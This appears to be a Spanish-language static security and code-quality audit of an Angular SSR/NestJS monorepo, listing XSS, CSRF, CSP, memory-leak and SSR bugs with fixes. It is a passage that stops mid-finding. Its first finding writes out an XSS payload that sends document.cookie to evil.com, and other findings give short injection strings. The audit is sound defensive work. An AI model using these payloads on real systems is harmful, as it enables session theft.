# INFORME DE AUDITORÍA COMPLETA — JSL Technology
## Proyecto: Angular SSR + NestJS API (Monorepo NX)
## Fecha: 2026-05-23
## Auditado por: Claude Code (análisis estático multi-agente)

---

## RESUMEN EJECUTIVO

Se auditaron **más de 120 archivos** del proyecto (TypeScript, HTML, SCSS, JSON de configuración).  
Se encontraron **154 problemas** distribuidos en cinco grandes áreas:

| Área | Críticos | Altos | Medios | Bajos | Total |
|------|----------|-------|--------|-------|-------|
| Seguridad | 4 | 10 | 8 | 0 | 22 |
| Memory Leaks / Race Conditions | 0 | 8 | 8 | 2 | 18 |
| Bugs y Calidad de Código | 0 | 8 | 15 | 12 | 35 |
| UX / Accesibilidad / HTML | 7 | 26 | 20 | 5 | 58 |
| CSS / SCSS / Rendimiento Visual | 0 | 5 | 13 | 3 | 21 |
| **TOTAL** | **11** | **57** | **64** | **22** | **154** |

---

# SECCIÓN I — SEGURIDAD

---

## SEG-01 — XSS en correo HTML de alertas de ventas (Backend)
**Archivo:** `apps/api/src/app/contact.service.ts`  
**Líneas:** 159–173  
**Severidad:** CRÍTICA  
**Categoría:** SEGURIDAD / XSS

**Evidencia:**
```typescript
htmlContent: `
  <h2>New hot lead received</h2>
  <p><strong>Name:</strong> ${formData.name}</p>        // SIN ESCAPAR
  <p><strong>Email:</strong> <a href="mailto:${formData.email}">${formData.email}</a></p>
  <p><strong>Company:</strong> ${formData.company ?? '—'}</p>
  <p><strong>Message:</strong><br>${formData.message}</p> // SIN ESCAPAR
`
```

**Justificación:** Todos los campos del formulario de contacto (`name`, `email`, `company`, `message`, `phone`) se interpolan directamente en el cuerpo HTML del correo interno sin aplicar ningún escape de entidades HTML. Un atacante puede enviar en cualquier campo un payload como `<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">` que se ejecutará en el cliente de correo del equipo de ventas. Clientes como Outlook, Apple Mail y Gmail web renderizan HTML. El campo `message` es especialmente peligroso.

**Corrección:** Crear función `escapeHtml(str)` que reemplace `&`, `<`, `>`, `"`, `'` por sus entidades HTML y aplicarla a todos los campos antes de insertar en el template.

---

## SEG-02 — XSS en correo HTML de mail.service.ts (Backend)
**Archivo:** `apps/api/src/app/mail.service.ts`  
**Líneas:** 57–59  
**Severidad:** CRÍTICA  
**Categoría:** SEGURIDAD / XSS

**Evidencia:**
```typescript
html: `
  ...
  <p><strong>Message:</strong></p>
  <p>${contactData.message}</p>    // SIN ESCAPAR
  <p><strong>Phone:</strong> ${contactData.phone}</p>
`
```

**Justificación:** Mismo patrón que SEG-01. El campo `message` y todos los demás campos de `contactData` se insertan sin escape HTML en el correo SMTP. Doble vector de ataque: tanto el correo interno de alertas de ventas (`contact.service.ts`) como el de confirmación al cliente (`mail.service.ts`) son vulnerables.

---

## SEG-03 — `SafeUrlPipe` desactiva completamente la sanitización de Angular
**Archivo:** `apps/app/src/app/shared/pipes/safe-url.pipe.ts`  
**Líneas:** 11–13  
**Severidad:** CRÍTICA  
**Categoría:** SEGURIDAD / XSS

**Evidencia:**
```typescript
transform(url: string): SafeResourceUrl {
  return this.sanitizer.bypassSecurityTrustResourceUrl(url);
}
```

**Justificación:** `bypassSecurityTrustResourceUrl` desactiva completamente el sanitizador de Angular para esa URL. Este pipe es usado en `video-modal.ts` con `[src]="videoUrl | safeUrl"`. Si `videoUrl` contiene `javascript:alert(1)`, `data:text/html,<script>...`, o una URL de un dominio malicioso, se inyectará directamente en un `<iframe>`. No hay validación de esquema (`https://`), dominio en allowlist ni formato antes de llamar al método. Cualquier dato externo (API, query params) que llegue a `videoUrl` es un vector de XSS.

**Corrección:**
```typescript
private readonly ALLOWED_HOSTS = ['www.youtube.com', 'www.youtube-nocookie.com', 'player.vimeo.com', 'calendly.com'];
transform(url: string): SafeResourceUrl {
  try {
    const parsed = new URL(url);
    if (!this.ALLOWED_HOSTS.includes(parsed.hostname)) throw new Error('Domain not allowed');
    return this.sanitizer.bypassSecurityTrustResourceUrl(url);
  } catch { return this.sanitizer.bypassSecurityTrustResourceUrl('about:blank'); }
}
```

---

## SEG-04 — Inyección de script via `projectId` en ClarityService
**Archivo:** `apps/app/src/app/core/services/clarity.service.ts`  
**Líneas:** 55–63  
**Severidad:** CRÍTICA  
**Categoría:** SEGURIDAD / XSS

**Evidencia:**
```typescript
script.innerHTML = `
  (function(c,l,a,r,i,t,y){
    ...
  })(window,document,"clarity","script","${this.projectId}");
`;
```

**Justificación:** El valor de `this.projectId` se interpola directamente en `innerHTML` de un `<script>`. Si `CLARITY_PROJECT_ID` contiene `");alert(1)//` (posible por un secreto comprometido en CI/CD, typo, o ataque supply chain), se ejecuta código JavaScript arbitrario en **todos los usuarios** de la aplicación. Un ID de Clarity válido son solo caracteres alfanuméricos, así que la validación con `/^[a-zA-Z0-9_-]+$/` es suficiente.

---

## SEG-05 — Inyección de script via `pixelId` en MetaPixelService
**Archivo:** `apps/app/src/app/core/services/meta-pixel.service.ts`  
**Líneas:** 53–65  
**Severidad:** ALTA  
**Categoría:** SEGURIDAD / XSS

**Evidencia:**
```typescript
script.innerHTML = `
  !function(f,b,e,v,n,t,s){ ... }
  fbq('init', '${this.pixelId}');
`;
noscript.innerHTML = `<img ... src="https://www.facebook.com/tr?id=${this.pixelId}&ev=PageView..."/>`;
```

**Justificación:** Mismo patrón que SEG-04. `pixelId` proviene de `(globalThis as any).__env?.META_PIXEL_ID`. La variable `__env` se inyecta en el HTML del servidor, y si el despliegue tiene un vector de manipulación de esa variable, todos los usuarios reciben código malicioso. Además el tag `noscript` interpolado también puede ser manipulado para inyectar atributos HTML adicionales.

---

## SEG-06 — CSRF ausente en todos los endpoints del backend NestJS
**Archivo:** `apps/api/src/main.ts`  
**Líneas:** 11–24  
**Severidad:** ALTA  
**Categoría:** SEGURIDAD / CSRF

**Evidencia:**
```typescript
const app = await NestFactory.create(AppModule);
app.useGlobalPipes(new ValidationPipe({ ... }));
// Sin app.use(csurf()), sin SameSite strict, sin Origin validation
await app.listen(port);
```

**Justificación:** Los endpoints `POST /api/contact` y `POST /api/newsletter` no tienen protección CSRF. Aunque reCAPTCHA mitiga el abuso automatizado en el formulario de contacto, el endpoint `/api/newsletter` no tiene ningún reCAPTCHA ni token CSRF. Un atacante puede hacer que un usuario autenticado en el sitio (si hubiera sesión) o que esté en una red donde las cookies son compartidas envíe peticiones forjadas desde cualquier dominio.

---

## SEG-07 — CORS no configurado explícitamente en NestJS
**Archivo:** `apps/api/src/main.ts`  
**Líneas:** 11–24  
**Severidad:** ALTA  
**Categoría:** SEGURIDAD / CONFIGURACIÓN

**Justificación:** No existe `app.enableCors({ origin: [...] })`. NestJS hereda el comportamiento de Express, que en algunos entornos puede ser permisivo. Si en algún despliegue el API corre en un subdominio diferente del frontend, y alguien añade un `enableCors()` sin configuración para "arreglar un error", quedaría abierto a cualquier origen. Debe declararse explícitamente con la allowlist de dominios propios.

---

## SEG-08 — Endpoint de diagnóstico `/seo/health` sin autenticación
**Archivo:** `apps/app/src/server.ts`  
**Líneas:** 394–421  
**Severidad:** ALTA  
**Categoría:** SEGURIDAD / EXPOSICIÓN DE INFORMACIÓN

**Evidencia:**
```typescript
app.get('/seo/health', (req, res) => {
  // Devuelve: número de rutas indexadas, rutas noindex, tipos de schema...
  res.json({ routes: seoRouteCount, noindex: noindexCount, schemas: [...] });
});
```

**Justificación:** Este endpoint expone detalles de la arquitectura interna (número de rutas, categorización SEO, tipos de schemas implementados) sin ninguna autenticación ni restricción de IP. Un atacante puede usar esta información para entender mejor la estructura del sitio y planear ataques más dirigidos.

---

## SEG-09 — `Content-Security-Policy` con `'unsafe-inline'` que neutraliza la CSP
**Archivo:** `apps/app/src/server.ts`  
**Líneas:** 461–472  
**Severidad:** ALTA  
**Categoría:** SEGURIDAD / CONFIGURACIÓN

**Evidencia:**
```typescript
"script-src 'self' 'unsafe-inline' https://www.googletagmanager.com ..."
```

**Justificación:** La directiva `script-src` incluye `'unsafe-inline'`, lo que invalida la mayor parte de la protección que ofrece la CSP contra XSS. Con `'unsafe-inline'`, cualquier `<script>` inyectado en el HTML (por un atacante que logre inyectar HTML) se ejecutaría. La CSP existe pero está esencialmente neutralizada para el propósito de mitigación de XSS. La solución es usar nonces o hashes para los inline scripts necesarios.

---

## SEG-10 — Rate limiting del servidor SSR de 10,000 peticiones/15min es inútil
**Archivo:** `apps/app/src/server.ts`  
**Líneas:** 80–87  
**Severidad:** ALTA  
**Categoría:** SEGURIDAD / CONFIGURACIÓN

**Evidencia:**
```typescript
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10000, // Límite aumentado significativamente para permitir tests E2E paralelos sin bloqueos 429
  ...
});
```

**Justificación:** 10,000 peticiones por 15 minutos equivale a ~11 req/seg. Esto no protege contra ningún scraping, DDoS o enumeración real. El comentario revela que fue aumentado para tests E2E pero nunca revertido. Los tests E2E deben ejecutarse con configuraciones de entorno separadas, no modificando valores de producción.

---

## SEG-11 — Validación insuficiente en endpoint `/api/newsletter`
**Archivo:** `apps/api/src/app/contact.controller.ts`  
**Líneas:** 14–17  
**Severidad:** ALTA  
**Categoría:** SEGURIDAD / INPUT VALIDATION

**Evidencia:**
```typescript
@Post('newsletter')
async subscribeNewsletter(@Body('email') email: string) {
  return this.contactService.handleNewsletterSubscription(email);
}
```

**Justificación:** El endpoint extrae `email` como `string` puro con `@Body('email')`, evitando por completo el `ValidationPipe` global que solo valida DTOs. Se puede enviar `null`, una cadena vacía, o una cadena como `"'; DROP TABLE subscribers;--"` sin ninguna validación de formato. La corrección es usar un DTO con `@IsEmail()`.

---

## SEG-12 — PII (emails de usuarios) en logs del servidor en texto plano (GDPR)
**Archivo:** `apps/api/src/app/contact.service.ts`  
**Líneas:** 21, 71, 126  
**Severidad:** MEDIA  
**Categoría:** SEGURIDAD / DATOS_SENSIBLES / GDPR

**Evidencia:**
```typescript
this.logger.log(`Receiving contact form: ${formData.email}`);
this.logger.log(`New newsletter subscription: ${email}`);
this.logger.log(`[LeadScore] ${formData.email}: score=${score} tier=${tier}`);
```

**Justificación:** Los emails de usuarios se escriben en los logs del servidor en texto plano. En entornos con logging centralizado (Datadog, Splunk, CloudWatch), los emails quedan expuestos en dashboards accesibles a múltiples personas y con retención indefinida. Esto viola el principio de minimización de datos del GDPR. Los logs deben hashear o anonimizar los datos PII.

---

## SEG-13 — PII (payload completo) en `console.log` del frontend
**Archivo:** `apps/app/src/app/core/services/api.service.ts`  
**Líneas:** 48, 59  
**Severidad:** MEDIA  
**Categoría:** SEGURIDAD / DATOS_SENSIBLES

**Evidencia:**
```typescript
console.log('ApiService: Enviando formulario de contacto...', payload);
console.log('ApiService: Suscribiendo al newsletter...', email);
```

**Justificación:** En código de producción, el payload completo del formulario (nombre, email, empresa, teléfono, presupuesto, tokens de analytics) se imprime en la consola del navegador del usuario. Extensiones del navegador, malware, o scripts de terceros pueden leer la consola y exfiltrar estos datos.

---

## SEG-14 — Security headers no aplicados a assets estáticos
**Archivo:** `apps/app/src/server.ts`  
**Líneas:** 426–441 vs 446–472  
**Severidad:** MEDIA  
**Categoría:** SEGURIDAD / CONFIGURACIÓN

**Justificación:** `express.static` (línea 426) se aplica antes de los middlewares de seguridad (línea 446+). Los archivos JS, CSS, imágenes y fuentes del directorio `/browser` son servidos sin `X-Content-Type-Options: nosniff`, sin `Cache-Control` seguro, y sin los demás headers de seguridad definidos más adelante. Un atacante podría aprovechar la ausencia de `X-Content-Type-Options` para ataques de MIME sniffing.

---

## SEG-15 — Service Worker cachea peticiones POST a `/api/**`
**Archivo:** `apps/app/src/ngsw-config.json`  
**Líneas:** 43–55  
**Severidad:** ALTA  
**Categoría:** SEGURIDAD / CONFIGURACIÓN

**Evidencia:**
```json
{
  "name": "api-freshness",
  "urls": ["/api/**"],
  "cacheConfig": { "strategy": "freshness", "timeout": "3s" }
}
```

**Justificación:** El patrón `/api/**` cachea TODAS las peticiones a la API, incluyendo `POST /api/contact` y `POST /api/newsletter`. Los `dataGroups` de Angular Service Worker no distinguen por método HTTP. Esto puede provocar que un envío de formulario offline devuelva una respuesta cacheada de éxito sin haber realmente enviado el correo al servidor — el usuario cree que envió, pero el mensaje se pierde.

---

## SEG-16 — Slugs en endpoints de datos sin validación (path traversal potencial futuro)
**Archivo:** `apps/api/src/app/data.controller.ts`  
**Líneas:** 13–16, 30–32  
**Severidad:** MEDIA  
**Categoría:** SEGURIDAD / INPUT VALIDATION

**Evidencia:**
```typescript
@Get('solutions/:slug')
getSolutionBySlug(@Param('slug') slug: string) {
  return this.dataService.getSolutionBySlug(slug);
}
```

**Justificación:** Los parámetros `slug` no tienen ningún decorador de validación (`@Matches(/^[a-z0-9-]+$/)`, `@IsSlug()`). Actualmente el servicio solo busca en arrays en memoria, pero si en el futuro se introduce una BD, la ausencia de validación sería inmediatamente explotable para SQL injection o path traversal. Adicionalmente, cuando el slug no se encuentra, el controlador devuelve `undefined` con HTTP 200 en lugar de lanzar `NotFoundException`.

---

## SEG-17 — `allowedHosts` del servidor SSR puede contener `undefined`
**Archivo:** `apps/app/src/server.ts`  
**Línea:** 489  
**Severidad:** MEDIA  
**Categoría:** SEGURIDAD / BUG

**Evidencia:**
```typescript
allowedHosts: ['127.0.0.1', 'localhost', '127.0.0.1:4000', 'localhost:4000', requestHost],
```

**Justificación:** `requestHost` proviene de `req.get('host')` que puede ser `undefined` si el header `Host` está ausente en la petición (posible con peticiones malformadas). El array `allowedHosts` contendrá entonces `undefined`, cuyo comportamiento en la validación de Angular SSR no está garantizado y puede causar errores o bypasses de la protección.

---

## SEG-18 — Importación del backend desde código fuente del frontend (acoplamiento cruzado)
**Archivo:** `apps/api/src/app/data.service.ts`  
**Líneas:** 7–13  
**Severidad:** ALTA  
**Categoría:** ARQUITECTURA / SEGURIDAD

**Evidencia:**
```typescript
import {
  SOLUTIONS,
  PRODUCTS,
  // ...
} from '../../../app/src/app/core/data/mock-data';
```

**Justificación:** El backend NestJS importa directamente desde el código fuente del frontend Angular con una ruta relativa `../../../app/src/app/...`. Esto viola la separación de responsabilidades, crea un acoplamiento rígido entre dos aplicaciones del monorepo, y si `mock-data.ts` llegara a contener lógica del cliente (imports de Angular, directivas, servicios), el compilador del backend lo procesaría también. En un escenario de seguridad, cualquier inyección en `mock-data.ts` del frontend afectaría también al backend.

---

---

# SECCIÓN II — MEMORY LEAKS Y CONDICIONES DE CARRERA

---

## MEM-01 — Suscripción a `onLangChange` sin destruir en `DirectionService`
**Archivo:** `apps/app/src/app/core/services/direction.service.ts`  
**Líneas:** 25–27  
**Severidad:** ALTA  
**Categoría:** MEMORY_LEAK

**Evidencia:**
```typescript
this.translate.onLangChange.subscribe((event: LangChangeEvent) => {
  this.syncDirection(event.lang);
});
```

**Justificación:** El servicio suscribe a `onLangChange` en `init()` pero nunca guarda la suscripción ni la destruye. `onLangChange` es un `EventEmitter` que no completa automáticamente. En tests unitarios con múltiples instancias del servicio o en futuros cambios de ciclo de vida, se acumularán suscripciones huérfanas. Debe usarse `takeUntilDestroyed()` o guardarse la referencia para `unsubscribe()`.

---

## MEM-02 — Suscripción a `onLangChange` sin destruir en `PersonalizationService`
**Archivo:** `apps/app/src/app/core/services/personalization.service.ts`  
**Líneas:** 26–28  
**Severidad:** ALTA  
**Categoría:** MEMORY_LEAK

**Evidencia:**
```typescript
translate.onLangChange.subscribe((event: any) => {
  this.currentLang.set(event.lang);
});
```

**Justificación:** Mismo patrón que MEM-01. El servicio es `providedIn: 'root'` pero la suscripción nunca se cancela. La mala práctica se repite sistemáticamente en el proyecto.

---

## MEM-03 — Suscripción a `router.events` sin destruir en `AnalyticsService`
**Archivo:** `apps/app/src/app/core/services/analytics.service.ts`  
**Líneas:** 265–270  
**Severidad:** ALTA  
**Categoría:** MEMORY_LEAK

**Evidencia:**
```typescript
this.router.events.pipe(filter(...)).subscribe((event) => {
  this.trackPageView(event as NavigationEnd);
});
```

**Justificación:** Suscripción a `router.events` sin `takeUntilDestroyed()` ni almacenamiento para `unsubscribe()`. Aunque como servicio singleton no hay destrucción en producción, este patrón es incorrecto y problemático en tests.

---

## MEM-04 — Suscripción a `router.events` sin destruir en `AttributionService`
**Archivo:** `apps/app/src/app/core/services/attribution.service.ts`  
**Líneas:** 33–37  
**Severidad:** ALTA  
**Categoría:** MEMORY_LEAK

**Evidencia:**
```typescript
this.router.events
  .pipe(filter((e): e is NavigationEnd => e instanceof NavigationEnd))
  .subscribe(() => this.captureCurrentTouch());
```

**Justificación:** Mismo patrón que MEM-03.

---

## MEM-05 — `SearchOverlayComponent`: `Subject` nunca completado, sin `ngOnDestroy`
**Archivo:** `apps/app/src/app/shared/components/search-overlay/search-overlay.ts`  
**Líneas:** 28–36  
**Severidad:** ALTA  
**Categoría:** MEMORY_LEAK

**Evidencia:**
```typescript
private searchSubject = new Subject<string>();

constructor(private dataService: DataService) {
  this.searchSubject.pipe(
    debounceTime(300),
    distinctUntilChanged()
  ).subscribe(q => { this.performSearch(q); });
}
// No hay ngOnDestroy, no hay searchSubject.complete()
```

**Justificación:** Cada vez que el overlay de búsqueda se monta y desmonta (puede ser múltiples veces por sesión), se crea una nueva suscripción activa que nunca se cancela. Después de N navegaciones, hay N suscripciones respondiendo simultáneamente al Subject. Es especialmente problemático porque el componente no tiene `ngOnDestroy`.

---

## MEM-06 — Suscripción a `onLangChange` en `Home` sin `takeUntil` (componente destructible)
**Archivo:** `apps/app/src/app/features/home/home.ts`  
**Línea:** 479  
**Severidad:** ALTA  
**Categoría:** MEMORY_LEAK

**Evidencia:**
```typescript
ngOnInit() {
  this.translate.onLangChange.subscribe((event) => {
    this.currentLang = event.lang;
  });
```

**Justificación:** A diferencia de los servicios singleton, `HomeComponent` puede montarse y desmontarse múltiples veces durante la navegación SPA. Cada mount añade una nueva suscripción a `onLangChange` que nunca se cancela porque no usa `takeUntil(this.destroy$)` (que sí existe en el componente pero no se usa aquí). Cada destrucción del componente deja un listener fantasma.

---

## MEM-07 — `addEventListener('scroll')` con cleanup via `destroy$.subscribe` (anti-patrón)
**Archivo:** `apps/app/src/app/features/home/home.ts`  
**Líneas:** 940–965  
**Severidad:** ALTA  
**Categoría:** MEMORY_LEAK / RACE_CONDITION

**Evidencia:**
```typescript
window.addEventListener('scroll', onScroll, { passive: true });
this.destroy$.subscribe(() => window.removeEventListener('scroll', onScroll));
```

**Justificación:** Usar `subscribe` en un Subject para cleanup es un anti-patrón: si el Subject ya emitió antes de que esta suscripción se añada (posible en condiciones de carrera durante init), el `removeEventListener` nunca ocurrirá. El patrón correcto es `takeUntil(this.destroy$)` en el pipe del observable que produce el evento.

---

## MEM-08 — `speechSynthesis` no cancelado al destruir `BlogDetailComponent`
**Archivo:** `apps/app/src/app/features/blog-detail/blog-detail.ts`  
**Líneas:** 219–235  
**Severidad:** MEDIA  
**Categoría:** MEMORY_LEAK

**Evidencia:**
```typescript
window.speechSynthesis.speak(this.utterance);
this.isListening.set(true);
// No hay ngOnDestroy que llame window.speechSynthesis.cancel()
```

**Justificación:** Si el usuario activa el "text-to-speech" y navega a otra ruta, el componente se destruye pero `window.speechSynthesis` sigue reproduciendo audio. No hay `ngOnDestroy` que llame a `window.speechSynthesis.cancel()`. El usuario puede quedar atrapado con audio sin poder detenerlo.

---

## MEM-09 — Suscripción en `Careers.injectJobPostingsSchema()` sin destruir
**Archivo:** `apps/app/src/app/features/careers/careers.ts`  
**Líneas:** 47–71  
**Severidad:** ALTA  
**Categoría:** MEMORY_LEAK

**Evidencia:**
```typescript
).subscribe(enrichedJobs => {
  this.seo.setJobPostingsSchema(enrichedJobs);
});
// El componente no implementa OnDestroy
```

**Justificación:** El `subscribe()` no guarda la suscripción y el componente no implementa `OnDestroy`. Si el componente se destruye y recrea (navegación hacia y desde /careers), la suscripción anterior sigue activa y puede ejecutar `setJsonLd` en un contexto destruido.

---

## MEM-10 — `PerformanceObserver` nunca desconectado en `AnalyticsService`
**Archivo:** `apps/app/src/app/core/services/analytics.service.ts`  
**Líneas:** 180–188  
**Severidad:** MEDIA  
**Categoría:** MEMORY_LEAK

**Evidencia:**
```typescript
const observer = new PerformanceObserver((list) => callback(list.getEntries()));
observer.observe({ type, buffered: true });
// Sin observer.disconnect() nunca
```

**Justificación:** Se crean hasta 4 instancias de `PerformanceObserver` (LCP, CLS, FID, FCP) sin guardar referencias ni llamar `.disconnect()`. Los observers permanecen activos indefinidamente, consumiendo CPU para procesar entradas de rendimiento innecesariamente.

---

## MEM-11 — Sentinels DOM de scroll-depth nunca limpiados al navegar
**Archivo:** `apps/app/src/app/core/services/analytics.service.ts`  
**Líneas:** 102–134  
**Severidad:** MEDIA  
**Categoría:** MEMORY_LEAK

**Evidencia:**
```typescript
requestAnimationFrame(() => {
  this.document.body.appendChild(sentinel);
  const observer = new IntersectionObserver(...);
  observer.observe(sentinel);
});
```

**Justificación:** Cada llamada a `initScrollDepthTracking()` añade 4 `<div>` sentinel al `<body>`. En `trackPageViews()` solo se limpia `scrollDepthReported.clear()` pero no se eliminan los divs del DOM ni se desconectan los observers de páginas anteriores. En una SPA con muchas navegaciones, el `<body>` se llena de divs huérfanos y observers activos sobre ellos.

---

## MEM-12 — `setInterval` de social proof sin referencia en el `setTimeout` externo
**Archivo:** `apps/app/src/app/features/home/home.ts`  
**Líneas:** 890–899  
**Severidad:** MEDIA  
**Categoría:** MEMORY_LEAK

**Evidencia:**
```typescript
private startSocialProofSimulation() {
  setTimeout(() => {         // setTimeout SIN referencia — no puede limpiarse
    this.showRandomSocialProof();
    this.socialProofInterval = setInterval(() => {
      this.showRandomSocialProof();
    }, 45000);
  }, 10000);
}
```

**Justificación:** El `setTimeout` de 10 segundos no está referenciado ni limpiado. Si el componente se destruye antes de esos 10 segundos, el callback se ejecutará de todas formas sobre un `this` destruido, asignará `socialProofInterval` post-destrucción y el `setInterval` resultante nunca podrá ser limpiado.

---

## RC-01 — Race condition en guard de navegación por `navigateByUrl` imperativo
**Archivo:** `apps/app/src/app/core/guards/language-init-guard.ts`  
**Líneas:** 24–74  
**Severidad:** MEDIA  
**Categoría:** RACE_CONDITION

**Evidencia:**
```typescript
this.router.navigateByUrl(targetUrl, { replaceUrl: true });
return false;
```

**Justificación:** El guard llama `router.navigateByUrl()` imperativamente y retorna `false` síncrono. Si el usuario navega rápidamente (múltiples clicks en links), pueden dispararse múltiples `navigateByUrl` concurrentes. En Angular 17+ con `provideRouter`, esto puede provocar redirecciones en loop o estado inconsistente del router. Lo correcto es retornar un `UrlTree` desde el guard.

---

## RC-02 — Race condition en formulario de contacto con doble submit
**Archivo:** `apps/app/src/app/features/contact/contact.ts`  
**Líneas:** 266–299  
**Severidad:** MEDIA  
**Categoría:** RACE_CONDITION

**Evidencia:**
```typescript
this.apiService
  .sendContactForm({ ... })
  .pipe(takeUntil(this.destroy$), finalize(() => { this.isSubmitting = false; }))
  .subscribe({ ... });
```

**Justificación:** Si el usuario hace clic en "Submit" múltiples veces rápidamente antes de que `isSubmitting = true` actualice la vista (puede ocurrir en el mismo frame de JS), se lanzan múltiples peticiones simultáneas al backend. El servidor recibirá múltiples correos duplicados. Se debe usar `switchMap` o deshabilitar el botón sincrónicamente antes de iniciar la llamada.

---

## RC-03 — Race condition en `LanguageSuggestionService`: múltiples timers concurrentes
**Archivo:** `apps/app/src/app/core/services/language-suggestion.service.ts`  
**Líneas:** 36–43  
**Severidad:** MEDIA  
**Categoría:** RACE_CONDITION

**Evidencia:**
```typescript
effect(() => {
  if (this.onboardingFlow.isLanguageStep()) {
    setTimeout(() => this.checkSuggestion(), 2000);
  }
});
```

**Justificación:** `effect()` en Angular se re-ejecuta cada vez que cambia una señal reactiva que consume. Si `isLanguageStep()` cambia de `false` a `true` múltiples veces (por ejemplo, por cambios de estado en el onboarding), se crearán múltiples timers de 2 segundos que llamarán a `checkSuggestion()` concurrentemente, potencialmente mostrando múltiples sugerencias de idioma simultáneas.

---

## RC-04 — Race condition en inicialización de Swipers con `setTimeout(fn, 100)`
**Archivo:** `apps/app/src/app/features/home/home.ts`  
**Líneas:** 730–887  
**Severidad:** MEDIA  
**Categoría:** RACE_CONDITION

**Evidencia:**
```typescript
setTimeout(() => {
  const heroSwiperEl = this.el.nativeElement.querySelector('.hero-slider swiper-container');
  if (heroSwiperEl) {
    heroSwiperEl.initialize();
  }
}, 100);
// Y también:
setTimeout(() => this.initializeOfferingsSlider(), 0); // Doble inicialización
```

**Justificación:** Se usa `setTimeout(fn, 100)` como sustituto de un mecanismo real de espera a que el DOM esté listo. En dispositivos lentos, 100ms puede ser insuficiente. Además, `initializeOfferingsSlider` se llama desde dos lugares distintos (un setTimeout de 0ms dentro de un setTimeout de 1500ms, Y dentro del setTimeout de 100ms en `ngAfterViewInit`), creando una doble inicialización potencial del slider.

---

---

# SECCIÓN III — BUGS Y CALIDAD DE CÓDIGO

---

## BUG-01 — `@Inject(PLATFORM_ID)` combinado incorrectamente con `inject()` en `BlogDetailComponent`
**Archivo:** `apps/app/src/app/features/blog-detail/blog-detail.ts`  
**Línea:** 72  
**Severidad:** ALTA  
**Categoría:** BUG

**Evidencia:**
```typescript
@Inject(PLATFORM_ID) private platformId = inject(PLATFORM_ID);
```

**Justificación:** `@Inject()` es un decorador de parámetros de constructor; `inject()` es una función de campo. Combinarlos es un error de patrón que puede producir comportamiento indefinido según la versión de Angular. El correcto es solo `private platformId = inject(PLATFORM_ID)`.

---

## BUG-02 — Navegación a `/thank-you` sin prefijo de idioma
**Archivo:** `apps/app/src/app/features/contact/contact.ts`  
**Línea:** 292  
**Severidad:** MEDIA  
**Categoría:** BUG

**Evidencia:**
```typescript
this.router.navigate(['/thank-you']);
```

**Justificación:** Toda la aplicación usa rutas con prefijo de idioma (`/:lang/thank-you`). Esta navegación hardcodeada a `/thank-you` causará que el guard de idioma redirija al usuario, generando una redirección extra innecesaria o una URL incorrecta. Debe usar el idioma actual: `['/', this.currentLang, 'thank-you']`.

---

## BUG-03 — `injectRecaptchaScript()` accede a `document` sin guard SSR
**Archivo:** `apps/app/src/app/features/contact/contact.ts`  
**Líneas:** 320–328  
**Severidad:** ALTA  
**Categoría:** BUG

**Evidencia:**
```typescript
private injectRecaptchaScript(): void {
  if (!this.recaptchaSiteKey || document.getElementById('recaptcha-enterprise-script')) return;
  const script = document.createElement('script');
  document.head.appendChild(script);
}
```

**Justificación:** `injectRecaptchaScript()` se llama desde `ngOnInit()` sin verificar `isPlatformBrowser`. Durante la renderización SSR, `document` no existe y causará `ReferenceError: document is not defined`, rompiendo el renderizado del servidor.

---

## BUG-04 — `checkPassiveSupport()` accede a `window` sin guard SSR
**Archivo:** `apps/app/src/app/app.ts`  
**Líneas:** 180–188  
**Severidad:** MEDIA  
**Categoría:** BUG

**Evidencia:**
```typescript
private checkPassiveSupport() {
  try {
    const opts = Object.defineProperty({}, 'passive', { ... });
    (window as any).addEventListener('testPassive', null, opts);
    (window as any).removeEventListener('testPassive', null, opts);
  } catch (e) { }
}
```

**Justificación:** Se llama en el `constructor()` (línea 101) sin `isPlatformBrowser`. En SSR, `window` no existe. El `try/catch` silencia el error, dejando `supportsPassive = false` incorrectamente. Esto afecta el comportamiento de los event listeners en el cliente, que usarán opciones subóptimas.

---

## BUG-05 — `ClickOutsideDirective` registra `document:click` en SSR
**Archivo:** `apps/app/src/app/shared/directives/click-outside.ts`  
**Líneas:** 17–24  
**Severidad:** ALTA  
**Categoría:** BUG

**Evidencia:**
```typescript
@HostListener('document:click', ['$event'])
onClick(event: Event) {
  // ...
}
```

**Justificación:** El `@HostListener('document:click')` se registra en el servidor durante SSR. Angular no proporciona un `document` DOM real en el contexto del servidor para event listeners, lo que puede causar errores o comportamientos inesperados. Debe verificarse `isPlatformBrowser` antes de registrar el listener.

---

## BUG-06 — `window.open()` en `WhitepaperDownload` sin guard SSR
**Archivo:** `apps/app/src/app/shared/components/whitepaper-download/whitepaper-download.ts`  
**Línea:** 79  
**Severidad:** MEDIA  
**Categoría:** BUG

**Evidencia:**
```typescript
setTimeout(() => window.open(url, '_blank'), 800);
```

**Justificación:** `window` no existe en SSR. Sin `isPlatformBrowser`, esto lanzará `ReferenceError: window is not defined` durante la renderización del servidor.

---

## BUG-07 — ROI Calculator: inconsistencia en cálculo mensual vs anual
**Archivo:** `apps/app/src/app/shared/components/roi-calculator/roi-calculator.component.ts`  
**Línea:** 25  
**Severidad:** MEDIA  
**Categoría:** BUG (datos financieros incorrectos)

**Evidencia:**
```typescript
monthlySavings = computed(() => this.weeklySavings() * 4);
annualSavings = computed(() => this.weeklySavings() * 52);
```

**Justificación:** `monthlySavings * 12 = weeklySavings * 48` pero `annualSavings = weeklySavings * 52`. Son matemáticamente inconsistentes: si el usuario multiplica el ahorro mensual por 12, obtendrá un valor diferente al ahorro anual mostrado. El año tiene ~52.18 semanas, no 48 (4×12). Esto genera datos financieros incorrectos que podrían influir en decisiones de negocio del cliente.

**Corrección:** `monthlySavings = computed(() => this.weeklySavings() * 52 / 12)`.

---

## BUG-08 — `ToastService`: timer `setTimeout` sin referencia, no puede cancelarse
**Archivo:** `apps/app/src/app/core/services/toast.service.ts`  
**Líneas:** 26–30  
**Severidad:** ALTA  
**Categoría:** BUG

**Evidencia:**
```typescript
if (duration > 0) {
  setTimeout(() => {
    this.remove(id);
  }, duration);
  // La referencia del timer no se guarda
}
```

**Justificación:** El `setTimeout` no se almacena. Si `remove(id)` se llama manualmente antes de que expire el timer (el usuario cierra el toast), el timer sigue activo y llamará a `remove(id)` de nuevo. En aplicaciones de larga duración donde el contador de IDs pueda desbordarse y reutilizarse, el timer podría eliminar un toast diferente al original.

---

## BUG-09 — `PersonalizationService`: precedencia incorrecta de `&&` vs `||`
**Archivo:** `apps/app/src/app/core/services/personalization.service.ts`  
**Líneas:** 70–76  
